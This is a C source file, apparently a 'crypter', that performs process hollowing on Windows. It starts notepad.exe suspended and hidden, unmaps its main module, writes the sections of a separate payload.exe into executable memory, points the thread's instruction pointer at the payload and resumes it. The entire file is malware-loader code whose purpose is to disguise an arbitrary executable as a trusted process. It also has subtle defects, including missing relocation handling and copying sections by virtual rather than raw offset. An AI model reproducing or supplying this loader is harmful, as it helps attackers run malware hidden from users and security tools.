#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <errno.h>
#include <stdlib.h>

// Define NTSTATUS
#ifndef NTSTATUS
#define NTSTATUS LONG
#endif

// Prototype of NtUnmapViewOfSection
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef struct {
    BYTE* buffer;   // Pointer to a byte array
    DWORD fileSize; // File size as a DWORD
} FileData;


#define MAX_SECTIONS 32 // Define a reasonable limit for sections

typedef struct {
    BYTE Name[IMAGE_SIZEOF_SHORT_NAME];
    DWORD VirtualSize;
    DWORD VirtualAddress;
} PESectionInfo;

typedef struct {
    DWORD baseAddress;
    DWORD sizeOfImage;
    DWORD entryPoint;
    DWORD numberOfSections;
    PESectionInfo sections[MAX_SECTIONS]; // Array to store section information
    DWORD sizeOfHeaders;
} PEImageInfo;

BOOL hasMemoryBeenUnmapped(HANDLE processHandle, LPVOID primaryModuleBaseAddress);
PROCESS_INFORMATION createSuspendedProcess(char *filePath);
LPVOID getPrimaryModuleBaseAddress(HANDLE hProcess);
void unmapPrimaryModule(HANDLE processHandle, LPVOID primaryModuleBaseAddress);
void printAllModuleInformation(HANDLE hProcesss);
FileData loadPEFileIntoMemory(char *filePath);
PEImageInfo getPEImageInfo(BYTE* buffer);
PVOID allocateSpaceForPayloadImage(HANDLE pHandle, LPVOID baseAddress, SIZE_T sizeOfPayLoadImage);
void printSectionName(BYTE Name[IMAGE_SIZEOF_SHORT_NAME]);
BOOL SetNewEntryPointAndResume(HANDLE hThread, DWORD newEntryPoint);


int main(int argc, char *argv[])
{

    // gcc crypter.c -o crypter.exe -lpsapi

    char *pathOfTargetProcess = "C:\\Windows\\system32\\notepad.exe";
    char *pathOfPayload = "payload.exe";

    // 1. Create the process which will be hollowed out.
    PROCESS_INFORMATION process = createSuspendedProcess(pathOfTargetProcess);
    printf("Suspended process created.\n");
    printf("---------------------------------\n\n");

    // 2. Find the base address of the primary module of the process.
    // printAllModuleInformation(process.hProcess);
    LPVOID primaryModuleBaseAddress = getPrimaryModuleBaseAddress(process.hProcess);
    printf("Primary Module Base Address: (0x%08X)\n", primaryModuleBaseAddress);
    printf("---------------------------------\n\n");

    // 3. Unmap the primary module from the process.
    const char *before = hasMemoryBeenUnmapped(process.hProcess, primaryModuleBaseAddress) ? "unmapped" : "mapped";
    unmapPrimaryModule(process.hProcess, primaryModuleBaseAddress);
    const char *after = hasMemoryBeenUnmapped(process.hProcess, primaryModuleBaseAddress) ? "unmapped" : "mapped";
    printf("Primary Module Unmapping | Before: %s, After: %s\n", before, after);
    printf("---------------------------------\n\n");

    // 4. Load payload PE into memory and extract its metedata.
    FileData payloadInBuffer = loadPEFileIntoMemory(pathOfPayload);
    printf("Size: %lu bytes, Byte array in hex:\n", payloadInBuffer.fileSize);
    PEImageInfo payloadImgInfo = getPEImageInfo(payloadInBuffer.buffer);
    printf("Base Address: 0x%p\n", (void*)payloadImgInfo.baseAddress);
    printf("Size of Image: %lu bytes\n", payloadImgInfo.sizeOfImage);
    printf("Entry Point: 0x%lu\n", payloadImgInfo.entryPoint);
    printf("Number of Sections: %lu\n", payloadImgInfo.numberOfSections);
    printf("Size of Headers: %lu bytes\n", payloadImgInfo.sizeOfHeaders);
    for(int i = 0; i < payloadImgInfo.numberOfSections; i++) {
        printSectionName(payloadImgInfo.sections[i].Name);
        printf("%lu bytes | 0x%lu\n", payloadImgInfo.sections[i].VirtualSize, payloadImgInfo.sections[i].VirtualAddress);
    }
    printf("---------------------------------\n\n");

    // 5. Allocate enough memory at the base address of the unmapped 
    //    primary module for later insertion of the payload PE.
    PVOID payloadImg = allocateSpaceForPayloadImage(process.hProcess, primaryModuleBaseAddress, payloadImgInfo.sizeOfImage);
    printf("Memory Allocated for Payload At: (0x%08X)\n", payloadImg);
    printf("---------------------------------\n\n");


    // 6. Rebasing the payload and copying the payload into the process.
    WriteProcessMemory
    (
        process.hProcess,                        
        primaryModuleBaseAddress,
        payloadInBuffer.buffer,
        payloadImgInfo.sizeOfHeaders,
        0
    );

    for (DWORD x = 0; x < payloadImgInfo.numberOfSections; x++) {
        PVOID pSectionDestination = (PVOID)((DWORD) primaryModuleBaseAddress + payloadImgInfo.sections[x].VirtualAddress);
    
        WriteProcessMemory
        (
            process.hProcess,            
            pSectionDestination,               
            &payloadInBuffer.buffer[payloadImgInfo.sections[x].VirtualAddress],
            payloadImgInfo.sections[x].VirtualSize,
            0
        );
    }


    // 7. Run the paylod.
    DWORD newEntryPoint = (DWORD) primaryModuleBaseAddress + payloadImgInfo.entryPoint;
    printf("(0x%08X)\n", primaryModuleBaseAddress);
    printf("(0x%08X)\n", payloadImgInfo.baseAddress);
    printf("(0x%08X)\n", newEntryPoint);
    SetNewEntryPointAndResume(process.hThread, newEntryPoint);
    
    Sleep(10000);
    
    CloseHandle(process.hProcess);
    CloseHandle(process.hThread);

    return 0;
}

BOOL SetNewEntryPointAndResume(HANDLE hThread, DWORD newEntryPoint) {
    CONTEXT context;
    ZeroMemory(&context, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_FULL; // Get the full context of the thread

    // Get the current thread context
    if (!GetThreadContext(hThread, &context)) {
        printf("GetThreadContext failed with error %lu\n", GetLastError());
        return FALSE;
    }

// #ifdef _WIN64
//     // For x64 architecture, RIP register holds the next instruction address
//     context.Rip = newEntryPoint;
// #else
//     // For x86 architecture, EIP register holds the next instruction address
//     context.Eip = newEntryPoint;
// #endif

    context.Rip = newEntryPoint;

    // Set the modified thread context
    if (!SetThreadContext(hThread, &context)) {
        printf("SetThreadContext failed with error %lu\n", GetLastError());
        return FALSE;
    }

    // Resume the thread
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("ResumeThread failed with error %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}



PVOID allocateSpaceForPayloadImage(HANDLE pHandle, LPVOID baseAddress, SIZE_T sizeOfPayLoadImage)
{
    PVOID payloadImg = VirtualAllocEx
    (
        pHandle,
        baseAddress,
        sizeOfPayLoadImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!payloadImg) {
        fprintf(stderr, "Unable to allocate space for payload image in process memory.\n");
        exit(EXIT_FAILURE);
    }

    return payloadImg;
}

void printSectionName(BYTE Name[IMAGE_SIZEOF_SHORT_NAME]) {
    // Create a buffer for the section name, adding 1 for the null terminator
    char sectionName[IMAGE_SIZEOF_SHORT_NAME + 1];

    // Copy the name to the buffer, ensuring it's null-terminated
    strncpy(sectionName, Name, IMAGE_SIZEOF_SHORT_NAME);

    // Explicitly null-terminate the string in case the original name used all 8 characters
    sectionName[IMAGE_SIZEOF_SHORT_NAME] = '\0';

    // Print the section name
    printf("%s | ", sectionName);
}

PEImageInfo getPEImageInfo(BYTE* buffer)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));

    DWORD baseAddress = (DWORD)ntHeaders->OptionalHeader.ImageBase;
    DWORD sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    DWORD numberOfSections = ntHeaders->FileHeader.NumberOfSections;
    DWORD sizeOfHeaders = ntHeaders->OptionalHeader.SizeOfHeaders;

    PEImageInfo payloadImgInfo;
    payloadImgInfo.baseAddress = baseAddress;
    payloadImgInfo.sizeOfImage = sizeOfImage;
    payloadImgInfo.entryPoint = entryPoint;
    payloadImgInfo.numberOfSections = numberOfSections;
    payloadImgInfo.sizeOfHeaders = sizeOfHeaders;

    for(DWORD i = 0; i < numberOfSections && i < MAX_SECTIONS; i++) {
        memcpy(payloadImgInfo.sections[i].Name, sectionHeaders[i].Name, IMAGE_SIZEOF_SHORT_NAME);
        payloadImgInfo.sections[i].VirtualSize = sectionHeaders[i].Misc.VirtualSize;
        payloadImgInfo.sections[i].VirtualAddress = sectionHeaders[i].VirtualAddress;
    }

    return payloadImgInfo;
}


FileData loadPEFileIntoMemory(char *filePath) {
    // Open the file
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Unable to open file.\n");
        exit(EXIT_FAILURE);
    }

    // Get the file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        fprintf(stderr, "Unable to determine file size.\n");
        CloseHandle(hFile);
        exit(EXIT_FAILURE);
    }

    // Allocate memory for the file content
    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        fprintf(stderr, "Memory allocation failed.\n");
        CloseHandle(hFile);
        exit(EXIT_FAILURE);
    }
    

    // Read the file into the buffer
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        fprintf(stderr, "Failed to read file.\n");
        free(buffer); // Free the allocated memory
        CloseHandle(hFile);
        exit(EXIT_FAILURE);
    }

    CloseHandle(hFile);

    // Create FileData struct instance and populate it
    FileData f;
    f.buffer = buffer;
    f.fileSize = fileSize; // Corrected: assign the file size to the struct member
    return f;
}





BOOL hasMemoryBeenUnmapped(HANDLE processHandle, LPVOID primaryModuleBaseAddress)
{
    MEMORY_BASIC_INFORMATION mbi;

    if (VirtualQueryEx(processHandle, primaryModuleBaseAddress, &mbi, sizeof(mbi)) != 0) {
        if (mbi.State == MEM_FREE) {
            return TRUE;
        } else {
            return FALSE;
        }
    } else {
        fprintf(stderr, "Error encountered when checking if memory is mapped. VirtualQueryEx failed.\n");
        exit(EXIT_FAILURE);
    }
}

void unmapPrimaryModule(HANDLE processHandle, LPVOID primaryModuleBaseAddress)
{
    // Dynamically load the function
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll == NULL) {
        printf("Unable to load ntdll.dll.\n");
        // exit with error
    }

    // Load the unmapping function from the DLL
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection == NULL) {
        printf("Unable to load NtUnmapViewOfSection.\n");
        // exit with error
    }

    // Unmap.
    NTSTATUS status = NtUnmapViewOfSection(processHandle, primaryModuleBaseAddress);


    // Mapping sanity check.
    if (status != 0) {
        fprintf(stderr, "Unmapping of memory for primary module unsuccessful.\n");
        exit(EXIT_FAILURE);
    }

    // Unload the dll.
    FreeLibrary(ntdll);
}


void printAllModuleInformation(HANDLE hProcess) 
{
    HMODULE modules[1024];
    DWORD cbNeeded;
    
    
    if(!EnumProcessModules(hProcess, modules, sizeof(modules), &cbNeeded)) {
        fprintf(stderr, "Unable to enumerate all modules within the process.\n");
        exit(EXIT_FAILURE);
    }

    int i;
    int numOfModules = cbNeeded / sizeof(HMODULE);
    for (i = 0; i < numOfModules; i++) {
        char moduleFilepath[MAX_PATH];
        DWORD sizeOfFilenameInBuffer = sizeof(moduleFilepath) / sizeof(moduleFilepath[0]);

        // Get the full path to the module's file.s
        if(!GetModuleFileNameEx(hProcess, modules[i], moduleFilepath, sizeOfFilenameInBuffer)) {
            fprintf(stderr, "Unable to get module %d filename.\n", i);
            // exit(EXIT_FAILURE);
            continue;
        }

        // Get more information about module.
        MODULEINFO mInfo;
        if(!GetModuleInformation(hProcess, modules[i], &mInfo, sizeof(mInfo))) {
            fprintf(stderr, "Unable to get module %d information.\n", i);
            // exit(EXIT_FAILURE);
            continue;
        }

        printf(
            "File Path: %s, Base Address:(0x%08X), Size of Image: %d bytes, Entry Point: (0x%08X)\n", 
            moduleFilepath, 
            mInfo.lpBaseOfDll,
            mInfo.SizeOfImage,
            mInfo.EntryPoint
        ); 
    }
}

LPVOID getPrimaryModuleBaseAddress(HANDLE hProcess) 
{
    /*
    A process is made up of one or more module. Each module is a .exe or .dll
    file needed to run the program. For instance, the original PE file will
    be one of the .exe and kernel32.dll will be another if widnows.h is called.
    */

    HMODULE modules[1024];
    DWORD cbNeeded;

    // EnumProcessModules gets information from all the modules.
    if(!EnumProcessModules(hProcess, modules, sizeof(modules), &cbNeeded)) {
        fprintf(stderr, "Unable to enumerate all modules within the process.\n");
        exit(EXIT_FAILURE);
    }

    return modules[0];
}

PROCESS_INFORMATION createSuspendedProcess(char *filePath)
{
    /*
    Documentation:
    https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes
    */
    
    STARTUPINFO si; // holds information about the window of the process
    PROCESS_INFORMATION pi; // holds information about the process itself

    // zero out the structures so that some random values
    // in those cells don't cause the process to have an 
    // unwanted state
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Specify that you want the wShowWindow member to be used
    si.dwFlags = STARTF_USESHOWWINDOW;
    // Set the window to be hidden
    si.wShowWindow = SW_HIDE;

    CreateProcess
    (
        NULL, // module name
        filePath, // location of file     
        NULL, // NULL = do not inherit process handle
        NULL, // NULL =  do not inherit thread handle
        FALSE, // FALSE = set handle inheritance to false
        CREATE_SUSPENDED, // creation flags
        NULL, // NULL = inherit parent's envrionement variables (system settings)
        NULL, // NULL = inherit parent's directory
        &si,
        &pi
    );

    // WaitForSingleObject(pi.hProcess, INFINITE);

    // Resume the process
    ResumeThread(pi.hThread);
    Sleep(100); // Wait for a short period to allow some initialization
    // Suspend the process again
    SuspendThread(pi.hThread);

    return pi;
}
